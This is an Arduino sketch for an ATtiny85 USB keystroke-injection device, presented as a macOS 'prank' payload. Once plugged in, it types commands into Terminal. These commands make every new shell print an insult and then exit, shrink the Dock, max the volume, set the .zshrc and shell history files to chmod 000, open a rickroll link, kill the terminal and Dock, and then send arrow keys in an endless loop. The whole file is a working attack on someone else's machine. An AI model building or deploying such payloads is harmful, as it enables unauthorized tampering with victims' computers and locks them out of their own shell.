/*
 * Created by Kema-dev
 * To be compiled and flashed with Arduino IDE, on an AT Tiny 85 device, with appropriate libraries
 * This payload is designed for MacOS
 * It opens a regular terminal and pimps the zshrc, dock, and opens a regular rickroll
 * Be careful at embedded memory, you shall not use more than ~52/53% of it to prevent malfunctions
 */

#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("terminal");
  DigiKeyboard.delay(600);
  DigiKeyboard.println("echo -e \"echo \"YOU GOT PRANKED ASSHOLE\"\nsleep 5; exit\" >> ~/.zshrc");
  DigiKeyboard.println("defaults write com.apple.dock tilesize -integer 1 && defaults write com.apple.dock largesize -integer 1");
  DigiKeyboard.println("osascript -e \"set Volume 100\"");
  DigiKeyboard.println("chmod 000 ~/.zsh_history ~/.bash_history ~/.zshrc && clear");
  DigiKeyboard.println("open \"https://youtu.be/dQw4w9WgXcQ?t=43s\" && killall iTerm  && killall Terminal && killall Dock");
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(KEY_F);
  while (1) DigiKeyboard.sendKeyStroke(0x52);
}